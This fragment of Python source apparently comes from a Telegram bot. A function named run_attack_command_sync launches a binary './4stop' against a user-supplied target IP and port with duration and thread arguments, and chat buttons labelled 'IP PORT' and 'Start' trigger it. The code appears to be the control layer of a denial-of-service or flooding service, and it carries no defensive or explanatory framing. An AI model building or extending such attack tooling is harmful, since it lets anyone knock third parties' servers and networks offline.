...
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        ...
        process = subprocess.Popen(
            ["./4stop", target_ip, str(target_port), "110", "1"],  # Updated to run with threads and start action
...
@bot.message_handler(func=lambda message: message.text == "IP PORT 🎃")
...
@bot.message_handler(func=lambda message: message.text == "Start ⚔️")
